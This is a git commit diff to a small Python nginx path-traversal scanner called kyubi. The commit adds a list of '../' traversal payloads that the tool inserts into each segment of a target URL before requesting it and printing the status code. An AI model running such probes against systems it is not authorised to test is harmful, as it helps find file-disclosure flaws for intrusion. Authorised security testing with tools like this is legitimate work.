8f442d5c28fb038c4dd45cb4a7df820225985681
Mohd Shibli <mohdshibli270@gmail.com>
2019-10-04 15:47:52 +0530

    more payload added

--- kyubi/core.py
+++ kyubi/core.py
@@ -3,24 +3,20 @@ import sys
 import argparse as ag
 import requests as rq
 
-# split the url
-# append the payload to each split one at a time
-# request with the appended payload
+argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
+argparser.add_argument("url", type=str, help="URL of the target")
+argparser.add_argument("-v", help="increase verbosity", action="store_true", dest="verbose")
+argparser.add_argument("-d", help="wordlist path", type=str,  dest="wlist")
+argparser.add_argument("-a", help="append segment in the end", action="store_true")
+
+args = argparser.parse_args()
 
 def make_a_request (url):
     resp = rq.get(url, verify=True)
     return str(resp.status_code)
 
 def main():
-    argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
-    argparser.add_argument("url", type=str, help="URL of the target")
-    argparser.add_argument("-v", help="increase verbosity", action="store_true", dest="verbose")
-    argparser.add_argument("-d", help="wordlist path", type=str,  dest="wlist")
-    argparser.add_argument("-a", help="append segment in the end", action="store_true")
-
-    args = argparser.parse_args()
-
-    payload = "../"
+    payloads = ["../", "../../", "../../../../../../../../../../../"]
 
     parser = urlparse(args.url)
     path = parser.path
@@ -37,8 +33,9 @@ def main():
             _x = segment
         else:
             _x = ""
-        _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
-        sys.stdout.write("{0} \033[92m[{1}]\033[00m\n".format(_url, make_a_request(_url)))
+        for payload in payloads:
+            _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
+            sys.stdout.write("{0} \033[92m[{1}]\033[00m\n".format(_url, make_a_request(_url)))
 
 
 if __name__ == '__main__':
